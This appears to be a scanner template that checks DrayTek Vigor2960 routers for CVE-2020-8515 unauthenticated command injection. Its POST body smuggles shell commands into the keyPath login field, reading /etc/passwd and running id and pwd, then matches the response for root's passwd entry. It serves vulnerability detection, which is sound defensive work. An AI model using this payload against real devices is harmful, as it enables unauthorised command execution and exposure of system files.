id: yaml-poc-draytek-vigor2960-unauthorized_access-CVE-2020-8515
info:
  name: Yaml Poc Draytek Vigor2960 Unauthorized_Access Cve 2020 8515
  author: converted
  severity: critical
  description: 'Converted from xpoc: yaml-poc-draytek-vigor2960-unauthorized_access-CVE-2020-8515'
  tags: unauth,cve
  classification:
    cve-id: CVE-2020-8515
  reference:
  - http://packetstormsecurity.com/files/156979/DrayTek-Vigor2960-Vigor3900-Vigor300B-Remote-Command-Execution.html
  - https://cxsecurity.com/issue/WLB-2020040007
  - https://nvd.nist.gov/vuln/detail/CVE-2020-8515
  - https://packetstormsecurity.com/files/156979/DrayTek-Vigor2960-Vigor3900-Vigor300B-Remote-Command-Execution.html
  - https://sku11army.blogspot.com/2020/01/draytek-unauthenticated-rce-in-draytek.html
http:
- method: POST
  path:
  - /cgi-bin/mainfunction.cgi
  body: action=login&keyPath=%27%0A%2fbin%2fcat${IFS}%2f/etc/passwd%26id%26pwd&loginUser=a&loginPwd=a
  headers:
    Content-Type: text/plain; charset=UTF-8
  matchers-condition: and
  matchers:
  - type: status
    status:
    - 200
  - type: word
    part: body
    words:
    - uid
    - gid
  - type: regex
    part: body
    regex:
    - 'root:[x*]:0:0:'
